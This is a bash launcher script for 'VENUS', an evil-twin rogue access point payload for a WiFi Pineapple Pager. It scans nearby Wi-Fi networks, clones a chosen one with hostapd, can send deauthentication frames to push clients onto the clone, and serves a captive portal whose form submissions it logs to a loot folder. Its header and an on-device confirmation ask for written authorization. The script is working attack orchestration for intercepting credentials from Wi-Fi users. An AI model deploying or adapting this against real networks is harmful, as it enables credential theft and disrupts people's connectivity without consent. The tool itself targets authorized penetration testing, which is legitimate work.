#!/bin/bash
# Title: VENUS - Flytrap Rogue AP
# Author: sinX
# Description: Interactive evil-twin flytrap. Recon live APs on the Pager, clone one with A, then watch captured clients land on an animated spiderweb. Serves a captive portal and can lure clients with targeted deauth.
# Version: 1.0.0
# Category: user/interception
# Firmware: 2.0.0-stable or newer
# Requires: python3-light, hostapd, iw (aireplay-ng optional, for the lure;
#           dnsmasq optional, only a fallback for the built-in DHCP server)
#
# Authorized testing only. VENUS impersonates a Wi-Fi network, can deauth
# clients to steer them onto the clone, and logs anything submitted to its
# captive portal. Use it only on networks you own or have written permission
# to test.
#
# LED States
#   Cyan     recon / idle
#   Red      trap live with lure enabled
#   Green    trap live, lure off
#   White    stopped / cleaned up
#
# Loot
#   /root/loot/venus/events.jsonl              every engine event
#   /root/loot/venus/portal_submissions.jsonl  captured portal form posts
#   /root/loot/venus/last_run.log              engine + UI log
#
# Controls (on-device UI)
#   RECON   UP/DOWN select AP, A trap it, B quit
#   TRAP    UP/DOWN select fly, A toggle deauth lure, B drop trap

# === CONFIGURATION ===
SCRIPT_SOURCE="${BASH_SOURCE[0]:-$0}"
SCRIPT_DIR="$(cd "$(dirname "$SCRIPT_SOURCE")" 2>/dev/null && pwd)"

# === DUCKYSCRIPT STUBS (dev / non-Pager) ===
# Defined before anything can fail so error paths still print/serve dialogs.
if ! command -v LOG              >/dev/null 2>&1; then LOG()              { echo "${1:-} ${2:-}"; }; fi
if ! command -v LED              >/dev/null 2>&1; then LED()              { :; }; fi
if ! command -v VIBRATE          >/dev/null 2>&1; then VIBRATE()          { :; }; fi
if ! command -v RINGTONE         >/dev/null 2>&1; then RINGTONE()         { :; }; fi
if ! command -v ERROR_DIALOG     >/dev/null 2>&1; then ERROR_DIALOG()     { echo "ERROR: $*"; }; fi
if ! command -v CONFIRMATION_DIALOG >/dev/null 2>&1; then CONFIRMATION_DIALOG() { echo "true"; return 0; }; fi
if ! command -v START_SPINNER    >/dev/null 2>&1; then START_SPINNER()    { echo "... $*"; echo $$; }; fi
if ! command -v STOP_SPINNER     >/dev/null 2>&1; then STOP_SPINNER()     { :; }; fi
if ! command -v WAIT_FOR_INPUT   >/dev/null 2>&1; then WAIT_FOR_INPUT()   { read -r _btn; echo "${_btn:-B}"; }; fi

PAYLOAD_DIR=""
for candidate in "$SCRIPT_DIR" \
                 "/root/payloads/user/interception/venus" \
                 "/mmc/root/payloads/user/interception/venus" \
                 /root/payloads/user/*/venus \
                 /mmc/root/payloads/user/*/venus; do
    if [ -f "$candidate/venus.py" ]; then
        PAYLOAD_DIR="$candidate"
        break
    fi
done

if [ -z "$PAYLOAD_DIR" ]; then
    LOG "red" "venus.py not found next to payload.sh"
    ERROR_DIALOG "VENUS files missing.\nRedeploy the payload folder."
    exit 1
fi

# Site overrides: copy venus.conf.example to venus.conf and edit.
if [ -f "$PAYLOAD_DIR/venus.conf" ]; then
    # shellcheck disable=SC1091
    . "$PAYLOAD_DIR/venus.conf"
fi

: "${VENUS_HTTP_PORT:=80}"
: "${VENUS_AP_IP:=192.168.69.1}"
: "${VENUS_PORTAL_TITLE:=Sign in to Wi-Fi}"
: "${VENUS_PASSWORD:=}"
: "${VENUS_COUNTRY:=US}"
: "${VENUS_NO_PORTAL:=0}"
: "${VENUS_NO_CAPTURE:=0}"
: "${VENUS_LURE:=0}"
: "${VENUS_NO_LURE:=0}"
: "${VENUS_NO_GUARD:=0}"
: "${VENUS_PAGERCTL:=1}"
: "${VENUS_SCAN_INTERVAL:=6}"
: "${VENUS_LURE_INTERVAL:=8}"
: "${VENUS_OUI_FILE:=}"
: "${VENUS_IFACE:=}"
: "${VENUS_RECON_IFACE:=}"

ENGINE="$PAYLOAD_DIR/venus.py"
UIPY="$PAYLOAD_DIR/pager_ui.py"
PORTAL_DIR="$PAYLOAD_DIR/portal"
STATE_FILE="/tmp/venus_state.json"
CMD_FILE="/tmp/venus_cmd.jsonl"
RUNLOG="/tmp/venus_run.log"
ENGINE_PID=""

confirmed() {
    [ "$1" = "$DUCKYSCRIPT_USER_CONFIRMED" ] || [ "$1" = "true" ]
}

echo "=== VENUS v1.0.0 START ===" > "$RUNLOG" 2>/dev/null
exec 2>>"$RUNLOG"
date >> "$RUNLOG" 2>/dev/null
LED BLUE 2>/dev/null
LOG ""
LOG "green" "VENUS  //  flytrap"
LOG "cyan"  "starting..."

# === AUTHORIZATION GATE ===
LOG "red" "=========================================="
LOG "red" "          AUTHORIZED TESTING ONLY"
LOG "red" "=========================================="
LOG ""
LOG "VENUS clones a Wi-Fi network, can"
LOG "deauthorize clients to steer them onto"
LOG "the clone, and logs captive-portal"
LOG "submissions."
LOG ""
LOG "Use only on networks you own or have"
LOG "written permission to test."
LOG ""
resp=$(CONFIRMATION_DIALOG "I confirm I have written authorization to test this network.")
rc=$?
case $rc in
    "${DUCKYSCRIPT_REJECTED:-__rejected}"|"${DUCKYSCRIPT_ERROR:-__error}")
        LED WHITE 2>/dev/null
        LOG "red" "Authorization not confirmed. Exiting."
        exit 1
        ;;
esac
confirmed "$resp" || {
    LED WHITE 2>/dev/null
    LOG "red" "Authorization not confirmed. Exiting."
    exit 1
}
LOG "green" "Authorization confirmed."

# === PYTHON ===
PYTHON3_BIN=""
for _p in python3 /mmc/usr/bin/python3 /usr/bin/python3 /usr/local/bin/python3; do
    if command -v "$_p" >/dev/null 2>&1 || [ -x "$_p" ]; then
        PYTHON3_BIN="$_p"; break
    fi
done
if [ -z "$PYTHON3_BIN" ]; then
    LED RED 2>/dev/null
    LOG "red" "python3 not found"
    ERROR_DIALOG "python3 not found\nRun: opkg install python3-light"
    exit 1
fi

export LD_LIBRARY_PATH="$PAYLOAD_DIR/lib:${LD_LIBRARY_PATH}"
export PYTHONPATH="$PAYLOAD_DIR/lib:${PYTHONPATH}"

_CHECK=$("$PYTHON3_BIN" -c \
    "import os,sys,socket,json,subprocess,re,time,threading,hashlib,math,struct; print('OK')" \
    2>&1)
if [ "$_CHECK" != "OK" ]; then
    LED RED 2>/dev/null
    LOG "red" "Python module missing: $_CHECK"
    ERROR_DIALOG "Python module missing:\n$_CHECK\nRun: opkg install python3-light"
    exit 1
fi

# === DEPENDENCIES ===
_missing=""
for _bin in hostapd iw; do
    if ! command -v "$_bin" >/dev/null 2>&1 && \
       [ ! -x "/usr/sbin/$_bin" ] && [ ! -x "/mmc/usr/sbin/$_bin" ] && \
       [ ! -x "/usr/bin/$_bin" ] && [ ! -x "/mmc/usr/bin/$_bin" ]; then
        _missing="$_missing $_bin"
    fi
done
if [ -n "$_missing" ]; then
    LED RED 2>/dev/null
    LOG "red" "missing:$_missing"
    LOG "red" "opkg install hostapd"
    ERROR_DIALOG "Missing binaries:$_missing\n\nopkg install hostapd"
    exit 1
fi
if ! command -v aireplay-ng >/dev/null 2>&1; then
    LOG "yellow" "aireplay-ng not found - lure will be unavailable"
fi
# dnsmasq is only a fallback for the built-in raw DHCP server.
if ! command -v dnsmasq >/dev/null 2>&1; then
    LOG "yellow" "dnsmasq not found - using built-in DHCP (normal)"
fi

# === STORAGE ===
LOOT_DIR="/root/loot/venus"
if [ -d /mmc/root/loot ]; then
    LOOT_DIR="/mmc/root/loot/venus"
fi
mkdir -p "$LOOT_DIR" 2>/dev/null
chmod 700 "$LOOT_DIR" 2>/dev/null

# === CLEANUP ===
_CLEANED=""
_cleanup() {
    [ -n "$_CLEANED" ] && return
    _CLEANED=1
    # Ask the engine to shut down cleanly first.
    if [ -n "$ENGINE_PID" ] && kill -0 "$ENGINE_PID" 2>/dev/null; then
        printf '%s\n' '{"cmd":"shutdown"}' >> "$CMD_FILE" 2>/dev/null
        for _i in 1 2 3 4 5 6 7 8 9 10; do
            kill -0 "$ENGINE_PID" 2>/dev/null || break
            sleep 0.2
        done
        kill -TERM "$ENGINE_PID" 2>/dev/null
        wait "$ENGINE_PID" 2>/dev/null
    fi
    # Only our own AP/DHCP processes, matched by our private config paths.
    pkill -f "/tmp/venus_hostapd.conf" 2>/dev/null
    pkill -f "/tmp/venus_dnsmasq.conf" 2>/dev/null
    # Tear down the dedicated AP vif and any redirect table we may have left.
    if command -v iw >/dev/null 2>&1; then
        ip link set venus0 down 2>/dev/null
        iw dev venus0 del 2>/dev/null
    fi
    if command -v nft >/dev/null 2>&1; then
        nft delete table ip venus 2>/dev/null
    fi
    rm -f /tmp/venus_hostapd.conf /tmp/venus_dnsmasq.conf \
          /tmp/venus_dnsmasq.pid /tmp/venus_leases /tmp/venus_leases.tmp \
          /tmp/venus_hostapd.log /tmp/venus_dnsmasq.log /tmp/venus_nft.conf \
          "$STATE_FILE" "$CMD_FILE" 2>/dev/null
    if [ -n "$LOOT_DIR" ] && [ -d "$LOOT_DIR" ] && [ -f "$RUNLOG" ]; then
        cp "$RUNLOG" "$LOOT_DIR/last_run.log" 2>/dev/null
    fi
    if ! pgrep -x pineapple >/dev/null 2>&1; then
        /etc/init.d/pineapplepager start 2>/dev/null
    fi
    LOG ""
    LOG "green" "VENUS stopped."
    LED WHITE 2>/dev/null
}
trap _cleanup EXIT INT TERM
trap '' HUP 2>/dev/null

# === CLEAR STALE PROCESSES ===
pkill -f "python3.*venus.py run" 2>/dev/null
pkill -f "python3.*venus.py simulate" 2>/dev/null
pkill -f "python3.*pager_ui.py" 2>/dev/null
pkill -f "/tmp/venus_hostapd.conf" 2>/dev/null
pkill -f "/tmp/venus_dnsmasq.conf" 2>/dev/null
if command -v iw >/dev/null 2>&1; then
    ip link set venus0 down 2>/dev/null
    iw dev venus0 del 2>/dev/null
fi
if command -v nft >/dev/null 2>&1; then
    nft delete table ip venus 2>/dev/null
fi
sleep 1
rm -f "$STATE_FILE" "$CMD_FILE"
: > "$CMD_FILE"

# === ENGINE ARGS ===
ENGINE_ARGS=(run
    --loot "$LOOT_DIR"
    --state "$STATE_FILE"
    --cmd "$CMD_FILE"
    --http-port "$VENUS_HTTP_PORT"
    --ap-ip "$VENUS_AP_IP"
    --portal-dir "$PORTAL_DIR"
    --portal-title "$VENUS_PORTAL_TITLE"
    --country "$VENUS_COUNTRY"
    --scan-interval "$VENUS_SCAN_INTERVAL"
    --lure-interval "$VENUS_LURE_INTERVAL")
[ -n "$VENUS_IFACE" ]       && ENGINE_ARGS+=(--iface "$VENUS_IFACE")
[ -n "$VENUS_RECON_IFACE" ] && ENGINE_ARGS+=(--recon-iface "$VENUS_RECON_IFACE")
[ -n "$VENUS_OUI_FILE" ]    && ENGINE_ARGS+=(--oui-file "$VENUS_OUI_FILE")
[ "$VENUS_NO_PORTAL" = "1" ] && ENGINE_ARGS+=(--no-portal)
[ "$VENUS_NO_CAPTURE" = "1" ] && ENGINE_ARGS+=(--no-capture)
[ "$VENUS_LURE" = "1" ]      && ENGINE_ARGS+=(--lure)
[ "$VENUS_NO_LURE" = "1" ]   && ENGINE_ARGS+=(--no-lure)
[ "$VENUS_NO_GUARD" = "1" ]  && ENGINE_ARGS+=(--no-guard)

# The passphrase goes through the environment so it never shows up in `ps`
# or in the run log. venus.py reads VENUS_PASSWORD when --password is absent.
export VENUS_PASSWORD

echo "Payload dir: $PAYLOAD_DIR" >> "$RUNLOG" 2>/dev/null
echo "Loot dir: $LOOT_DIR" >> "$RUNLOG" 2>/dev/null
echo "Engine args: ${ENGINE_ARGS[*]}" >> "$RUNLOG" 2>/dev/null

# === START ENGINE ===
LED CYAN 2>/dev/null
SPINNER_ID=$(START_SPINNER "Arming VENUS..." 2>/dev/null)
"$PYTHON3_BIN" "$ENGINE" "${ENGINE_ARGS[@]}" >>"$RUNLOG" 2>&1 &
ENGINE_PID=$!

_ok=0
for _t in $(seq 1 30); do
    sleep 0.4
    if ! kill -0 "$ENGINE_PID" 2>/dev/null; then
        break
    fi
    if [ -s "$STATE_FILE" ]; then
        _ok=1; break
    fi
done
STOP_SPINNER "$SPINNER_ID" 2>/dev/null

if [ "$_ok" != "1" ]; then
    LED RED 2>/dev/null
    _err=$(tail -8 "$RUNLOG" 2>/dev/null)
    LOG "red" "engine failed to start"
    ERROR_DIALOG "VENUS engine failed:\n$_err\n\nLog: $RUNLOG"
    exit 1
fi

LOG "green" "engine up"
LOG "cyan"  "recon: $(command -v iw >/dev/null 2>&1 && echo yes || echo no)"
LED GREEN 2>/dev/null
VIBRATE 2>/dev/null

# === ON-DEVICE UI ===
_HAS_UI=false
if [ "$VENUS_PAGERCTL" = "1" ] && \
   [ -f "$UIPY" ] && \
   [ -f "$PAYLOAD_DIR/lib/libpagerctl.so" ] && \
   [ -f "$PAYLOAD_DIR/lib/pagerctl.py" ] && \
   "$PYTHON3_BIN" -c "import ctypes" 2>/dev/null; then
    _HAS_UI=true
fi

if [ "$_HAS_UI" = "true" ]; then
    echo "Starting on-device UI." >> "$RUNLOG" 2>/dev/null
    _disp_start=$(date +%s 2>/dev/null || echo 0)
    VENUS_STATE="$STATE_FILE" VENUS_CMD="$CMD_FILE" \
        "$PYTHON3_BIN" "$UIPY" >>"$RUNLOG" 2>&1
    _disp_rc=$?
    _disp_end=$(date +%s 2>/dev/null || echo 99)
    _disp_elapsed=$((_disp_end - _disp_start))
    echo "pager_ui rc=$_disp_rc after ${_disp_elapsed}s" >> "$RUNLOG" 2>/dev/null
    # rc 0 is an intentional quit (the UI already sent shutdown); anything
    # else means pagerctl/render failure, so fall back to the LOG display.
    if [ "$_disp_rc" -ne 0 ]; then
        echo "UI failed rc=$_disp_rc - LOG fallback" >> "$RUNLOG" 2>/dev/null
        _HAS_UI=false
    fi
fi

if [ "$_HAS_UI" != "true" ]; then
    echo "Using LOG fallback display." >> "$RUNLOG" 2>/dev/null
    _phase=$("$PYTHON3_BIN" -c "import json;print(json.load(open('$STATE_FILE')).get('phase','?'))" 2>/dev/null)
    _conn=$("$PYTHON3_BIN" -c "import json;d=json.load(open('$STATE_FILE'));print(len(d.get('clients') or []))" 2>/dev/null)
    LOG ""
    LOG "magenta" "=============================================="
    LOG "magenta" "            V E N U S"
    LOG "magenta" "=============================================="
    LOG ""
    LOG "white"  "phase : ${_phase:-unknown}"
    LOG "white"  "flies : ${_conn:-0}"
    LOG "cyan"   "state : $STATE_FILE"
    LOG "cyan"   "cmd   : echo '{\"cmd\":\"trap\",\"ap\":...}' >> $CMD_FILE"
    LOG "red"    "[ B ] Stop"
    LOG ""
    while kill -0 "$ENGINE_PID" 2>/dev/null; do
        BUTTON=$(WAIT_FOR_INPUT)
        case "$BUTTON" in
            "B"|"RED"|"Escape") break ;;
        esac
    done
    kill -0 "$ENGINE_PID" 2>/dev/null || LOG "red" "engine exited"
fi

# If the UI returned because the user quit from the recon screen, the engine
# should already be stopped. Give it a moment, then let cleanup finish.
for _i in 1 2 3 4 5; do
    kill -0 "$ENGINE_PID" 2>/dev/null || break
    sleep 0.2
done

exit 0
